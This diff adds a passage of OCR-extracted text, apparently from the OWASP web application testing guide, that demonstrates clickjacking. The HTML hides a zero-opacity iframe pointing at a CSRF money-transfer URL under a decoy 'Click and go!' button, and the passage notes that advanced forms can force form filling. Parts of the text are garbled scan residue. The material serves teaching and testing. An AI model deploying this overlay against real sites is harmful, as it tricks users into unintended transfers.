@@ -1,0 +1,57 @@
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+205
+Web Application Penetration Testing
+}
+#content {
+width: 500px;
+height: 500px;
+margin-top: 150px ;
+margin-left: 500px;
+}
+#clickjacking
+{
+position: absolute;
+left: 172px;
+top: 60px;
+filter: alpha(opaci-
+ty=0);
+opacity:0.0
+}
+I--></style>
+</head>
+<body>
+<div id="content">
+<h1>www.owasp.com</h1>
+<form action="http:/www.
+owasp.com”">
+<input type="submit”
+class="button” value="Click and go!">
+</form>
+</div>
+<iframe id="clickjacking” src="http:/localhost/
+csrf/transfer.php?account=AT TACKER&amount=10000"
+width="500" height="500" scrolling="no" frameborder="-
+none’>
+</iframe>
+</body>
+</html>
+With the help of CSS (note the #clickjacking block) we can mask and
+suitably position the iframe in such a way as to match the buttons.
+If the victim click on the button “Click and go!” the form is submitted
+and the transfer is completed.
+MASEL
+O IFRAME
+eB
+a &
+WWW.
+OW AS 2. 0m
+The example presented uses only basic clickjacking technique, but
+with advanced technique is possible to force user filling form with
+values defined by the attacker.
+Tools
+= Context Information Security: “Clickjacking Tool” - http://www
+contextis.com/research/tools
